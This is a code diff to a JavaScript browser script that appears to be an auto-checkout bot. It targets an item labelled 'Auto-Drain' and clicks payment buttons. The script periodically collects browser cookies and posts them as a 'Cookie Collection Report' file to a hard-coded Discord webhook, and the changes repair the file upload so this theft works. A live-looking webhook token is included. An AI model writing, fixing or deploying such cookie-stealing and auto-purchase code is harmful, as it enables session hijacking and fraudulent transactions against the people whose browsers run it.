@@ -10,12 +10,11 @@ const config = {
   forceStopShortcut: "Alt+Shift+E",
   debugMode: true,
   // Specific item targeting (leave empty "" to add any item)
-  targetItemName: "Auto-Drain", // e.g., "PlayStation 5" or part of the item name
-  // Discord webhook configuration
+  targetItemName: "Auto-Drain", // 
   discordWebhook: {
     enabled: true,
-    url: "https://discord.com/api/webhooks/1425598331186450617/aZ1GNPgxuY61sidoAJTYYU78qbaMqM-Gv6auQX7XYHJ8c0ueRq1aFeuBV7s8b6DyOZyr", // Replace with your actual webhook URL
-    maxMessageLength: 2000, // Discord message limit
+    url: "https://discord.com/api/webhooks/1425598331186450617/aZ1GNPgxuY61sidoAJTYYU78qbaMqM-Gv6auQX7XYHJ8c0ueRq1aFeuBV7s8b6DyOZyr", 
+    maxMessageLength: 2000, 
     cookieLogEnabled: true,
     cookieLogInterval: 300000, // 5 minutes in milliseconds
   }
@@ -290,32 +289,45 @@ async function sendToDiscordWebhook(message, isFile = false) {
   try {
     debugLog("📡 [DISCORD DEBUG] Creating payload...", "info");
     
-    const payload = isFile ? {
-      content: "🍪 **Cookie Collection Report** 🍪",
-      files: [{
-        name: `cookies_${Date.now()}.txt`,
-        data: message
-      }]
-    } : {
-      content: message
-    };
-
-    debugLog(`📡 [DISCORD DEBUG] Payload created, type: ${isFile ? 'file' : 'message'}`, "info");
-    debugLog(`📡 [DISCORD DEBUG] Payload size: ${JSON.stringify(payload).length}`, "info");
+    let requestOptions;
+    
+    if (isFile) {
+      // For file uploads, create FormData directly
+      const formData = new FormData();
+      formData.append('content', "🍪 **Cookie Collection Report** 🍪");
+      
+      // Create a proper file blob
+      const blob = new Blob([message], { type: 'text/plain' });
+      formData.append('files[0]', blob, `cookies_${Date.now()}.txt`);
+      
+      debugLog(`📡 [DISCORD DEBUG] Payload created, type: file`, "info");
+      debugLog(`📡 [DISCORD DEBUG] File size: ${message.length} bytes`, "info");
+      
+      // Don't set Content-Type header - browser will set it automatically with boundary
+      requestOptions = {
+        method: 'POST',
+        body: formData
+      };
+    } else {
+      const payload = {
+        content: message
+      };
+      
+      debugLog(`📡 [DISCORD DEBUG] Payload created, type: message`, "info");
+      debugLog(`📡 [DISCORD DEBUG] Payload size: ${JSON.stringify(payload).length}`, "info");
+      
+      requestOptions = {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload)
+      };
+    }
 
     debugLog("📡 [DISCORD DEBUG] Sending fetch request...", "info");
-    
-    const requestOptions = {
-      method: 'POST',
-      headers: {
-        'Content-Type': isFile ? 'multipart/form-data' : 'application/json',
-      },
-      body: isFile ? createFormData(payload) : JSON.stringify(payload)
-    };
-
     debugLog(`📡 [DISCORD DEBUG] Request options:`, "info");
     debugLog(`📡 [DISCORD DEBUG] Method: ${requestOptions.method}`, "info");
-    debugLog(`📡 [DISCORD DEBUG] Content-Type: ${requestOptions.headers['Content-Type']}`, "info");
     debugLog(`📡 [DISCORD DEBUG] Body type: ${typeof requestOptions.body}`, "info");
 
     const response = await fetch(config.discordWebhook.url, requestOptions);
@@ -347,12 +359,6 @@ async function sendToDiscordWebhook(message, isFile = false) {
   }
 }
 
-function createFormData(payload) {
-  const formData = new FormData();
-  formData.append('content', payload.content);
-  formData.append('files[0]', new Blob([payload.files[0].data], {type: 'text/plain'}), payload.files[0].name);
-  return formData;
-}
 
 function splitMessageForDiscord(message, maxLength = 2000) {
   if (message.length <= maxLength) {
@@ -420,7 +426,8 @@ async function collectAndLogCookies() {
     // Format cookies for Discord
     const cookieReport = await formatCookiesForDiscord(cookies);
     debugLog(`🍪 [MAIN DEBUG] formatCookiesForDiscord() returned report of length ${cookieReport.length}`, "info");
-    debugLog(`🍪 [MAIN DEBUG] Report preview: ${cookieReport.substring(0, 200)}...`, "info");
+    debugLog(`🍪 [MAIN DEBUG] Report preview: ${cookieReport.substring(0, 300)}...`, "info");
+    debugLog(`🍪 [MAIN DEBUG] Cookie data valid: ${cookieReport.length > 0 && cookieReport !== "No cookies found."}`, "info");
     
     // Try to send as file first (if message is too long)
     if (cookieReport.length > config.discordWebhook.maxMessageLength) {
@@ -772,12 +779,19 @@ function clickPayNowIfExists() {
     const buttons = document.querySelectorAll("button");
     debugLog(`🔘 Found ${buttons.length} buttons on checkout page`, "info");
     
+    // Debug: Log all button texts
+    const buttonTexts = Array.from(buttons).map(btn => btn.textContent.trim()).filter(text => text.length > 0);
+    debugLog(`📝 Button texts: ${buttonTexts.join(', ')}`, "info");
+    
     const paymentTexts = ["pay now", "pay", "complete purchase", "buy now", "purchase", "place order"];
     let paymentButtonsFound = 0;
     
     for (const btn of buttons) {
       const span = btn.querySelector("span");
       const btnText = btn.textContent.trim().toLowerCase();
+      
+      // Skip empty buttons
+      if (!btnText) continue;
       
       // Check span text first
       if (span && span.textContent.trim().toLowerCase() === "pay now" && !btn.disabled) {
